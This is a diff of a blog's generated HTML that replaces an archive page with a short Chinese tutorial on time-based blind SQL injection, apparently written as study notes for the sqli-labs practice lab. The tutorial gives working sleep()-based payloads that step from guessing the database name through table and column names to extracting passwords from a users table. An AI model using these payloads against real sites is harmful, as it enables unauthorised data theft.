@@ -21,17 +21,19 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":false,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="原谅我这一生不羁放纵爱自由">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Scammer">
-<meta property="og:url" content="http://example.com/archives/2022/index.html">
+  <meta name="description" content="前言通过时间函数使SQL语句执行时间延长，从页面响应时间判断条件是否正确的一种注入方式。建议有不明白的地方可以先看看布尔盲注。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="时间盲注">
+<meta property="og:url" content="http://example.com/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/index.html">
 <meta property="og:site_name" content="Scammer">
-<meta property="og:description" content="原谅我这一生不羁放纵爱自由">
+<meta property="og:description" content="前言通过时间函数使SQL语句执行时间延长，从页面响应时间判断条件是否正确的一种注入方式。建议有不明白的地方可以先看看布尔盲注。">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-11-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-11-08T17:28:28.125Z">
 <meta property="article:author" content="Bron">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/archives/2022/">
+<link rel="canonical" href="http://example.com/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">
 
 
 <script id="page-configurations">
@@ -39,12 +41,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 <link rel="stylesheet" type="text/css" href="/css/injector/main.css" /><link rel="preload" as="style" href="/css/injector/light.css" /><link rel="preload" as="style" href="/css/injector/dark.css" />
-  <title>归档 | Scammer</title>
+  <title>时间盲注 | Scammer</title>
   
 
 
@@ -183,234 +185,194 @@
         <div class="content-wrap">
           
 
-          <div class="content archive">
+          <div class="content post posts-expand">
             
 
+    
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <span class="collection-header">嗯..! 目前共计 15 篇日志。 继续努力。</span>
-      </div>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Elaina.png">
+      <meta itemprop="name" content="Bron">
+      <meta itemprop="description" content="原谅我这一生不羁放纵爱自由">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Scammer">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          时间盲注
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-11-09 00:00:00 / 修改时间：01:28:28" itemprop="dateCreated datePublished" datetime="2022-11-09T00:00:00+08:00">2022-11-09</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <span class="collection-header">2022</span>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通过时间函数使SQL语句执行时间延长，从页面响应时间判断条件是否正确的一种注入方式。建议有不明白的地方可以先看看<a target="_blank" rel="noopener" href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>。</p>
+<span id="more"></span>
+
+<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>当页面不返回查询信息的数据，只知道返回信息的对错（true or false）时，甚至没有对错返回时，即可用此方式。</p>
+<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="sleep-second-函数"><a href="#sleep-second-函数" class="headerlink" title="sleep(second)函数"></a>sleep(second)函数</h2><p>延迟函数<br>作用：延迟second的时间<br>示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="benchmark-count-expr-函数"><a href="#benchmark-count-expr-函数" class="headerlink" title="benchmark(count,expr)函数"></a>benchmark(count,expr)函数</h2><p>作用：可测试某些特定操作的执行速度<br>count：执行次数<br>expr：表达式,表示重复计算表达式count次，评估执行表达式的效率<br>expr表达式必须返回单个值，不允许返回多行记录或多列值，因此只能查询一个字段，且返回值只有1个，才适用于这个函数。<br>示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> benchmark(<span class="number">100</span>,(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span>))</span><br></pre></td></tr></table></figure>
+
+<h1 id="过程步骤"><a href="#过程步骤" class="headerlink" title="过程步骤"></a>过程步骤</h1><ol>
+<li><p>判断数据库名长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>猜解数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr(database(),1,1)))&gt;120,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>判断数据库表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;120,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>判断数据库字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))))&gt;100,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>取数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and  if((ascii(substr(( select password from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+  </span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>说明：建议写脚本，脚本有机会以后添加</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43431158/article/details/97496092">sql注入学习——时间盲注</a></li>
+</ul>
+
     </div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+    
+    
+    
+        <div class="reward-container">
+  <div>我很可爱，请给我钱</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-11-09T00:00:00+08:00"
-              content="2022-11-09">
-          11-09
-        </time>
-      </div>
+  </div>
+</div>
 
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" itemprop="url">
-            <span itemprop="name">时间盲注</span>
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Bron
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" title="时间盲注">http://example.com/2022/11/09/时间盲注/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/Elaina_Anime">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
           </a>
-      </div>
+        </div>
 
-    </header>
-  </article>
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/SelfEnglishWords">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-11-08T00:00:00+08:00"
-              content="2022-11-08">
-          11-08
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/11/08/sqli-labs_4/" itemprop="url">
-            <span itemprop="name">sqli-labs_4</span>
+            <span class="label">Telegram</span>
           </a>
-      </div>
+        </div>
 
-    </header>
-  </article>
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-11-08T00:00:00+08:00"
-              content="2022-11-08">
-          11-08
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/11/08/sqli-labs_3/" itemprop="url">
-            <span itemprop="name">sqli-labs_3</span>
+            <span class="label">RSS</span>
           </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-11-08T00:00:00+08:00"
-              content="2022-11-08">
-          11-08
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/11/08/sqli-labs_5+6/" itemprop="url">
-            <span itemprop="name">sqli-labs_5+6</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-11-08T00:00:00+08:00"
-              content="2022-11-08">
-          11-08
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/11/08/sqli-labs_7/" itemprop="url">
-            <span itemprop="name">sqli-labs_7</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-11-08T00:00:00+08:00"
-              content="2022-11-08">
-          11-08
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" itemprop="url">
-            <span itemprop="name">布尔盲注</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-11-08T00:00:00+08:00"
-              content="2022-11-08">
-          11-08
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/" itemprop="url">
-            <span itemprop="name">报错注入常用函数</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-11-07T00:00:00+08:00"
-              content="2022-11-07">
-          11-07
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/11/07/Diary_1107/" itemprop="url">
-            <span itemprop="name">也无风雨也无晴</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-11-07T00:00:00+08:00"
-              content="2022-11-07">
-          11-07
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/11/07/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/" itemprop="url">
-            <span itemprop="name">SQL注入之字符型和数字型判断</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2022-11-07T00:00:00+08:00"
-              content="2022-11-07">
-          11-07
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/11/07/sqli-labs_1+2/" itemprop="url">
-            <span itemprop="name">SQL注入之sqli-labs_1+2</span>
-          </a>
-      </div>
-
-    </header>
-  </article>
-
-
+        </div>
     </div>
   </div>
-  
-  
-  
 
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/11/08/sqli-labs_4/" rel="prev" title="sqli-labs_4">
+      <i class="fa fa-chevron-left"></i> sqli-labs_4
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
   
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/archives/2022/page/2/">2</a><a class="extend next" rel="next" href="/archives/2022/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
-  </nav>
+  
+  
 
 
 
@@ -462,6 +424,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-number">2.</span> <span class="nav-text">应用场景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="nav-number">3.</span> <span class="nav-text">相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sleep-second-%E5%87%BD%E6%95%B0"><span class="nav-number">3.1.</span> <span class="nav-text">sleep(second)函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#benchmark-count-expr-%E5%87%BD%E6%95%B0"><span class="nav-number">3.2.</span> <span class="nav-text">benchmark(count,expr)函数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%87%E7%A8%8B%E6%AD%A5%E9%AA%A4"><span class="nav-number">4.</span> <span class="nav-text">过程步骤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%87%B4%E8%B0%A2"><span class="nav-number">5.</span> <span class="nav-text">致谢</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
